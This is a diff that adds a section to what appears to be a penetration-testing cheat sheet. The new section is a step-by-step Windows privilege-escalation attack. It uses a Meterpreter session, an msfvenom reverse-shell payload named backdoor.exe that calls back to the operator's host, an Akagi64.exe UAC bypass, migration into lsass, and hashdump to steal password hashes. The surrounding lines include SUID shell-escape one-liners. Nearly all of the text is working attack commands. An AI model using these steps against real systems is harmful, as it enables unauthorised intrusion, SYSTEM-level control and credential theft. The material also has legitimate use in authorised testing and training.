@@ -319,6 +319,42 @@ xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 | Find SUID exploit | `find . -exec /bin/sh -p \; -quit` |
 | Make binary SUID | `chmod u+s /tmp/bash` |
 
+### 🪟 PrivEsc via Akagi64.exe + Reverse Shell
+
+```bash
+# After gaining initial Meterpreter session:
+getuid
+sysinfo
+
+# Find a stable desktop user process (e.g., explorer.exe, winlogon.exe, svchost.exe) and migrate
+ps -S explorer.exe
+migrate process
+
+# Generate reverse shell payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f exe > backdoor.exe
+
+# Upload Akagi64.exe (UAC bypass) and payload
+cd C:\Users\admin\AppData\Local\Temp
+upload Akagi64.exe
+upload backdoor.exe
+
+# Open new Metasploit listener to catch SYSTEM shell
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <your-ip>
+set LPORT <your-port>
+exploit
+
+# Trigger UAC bypass to launch elevated payload
+shell
+Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+
+# In the new session (SYSTEM), migrate to protected process and dump hashes
+ps -S lsass.exe
+migrate 496
+hashdump
+
 #### PHP Reverse Shell Example
 
 ```php
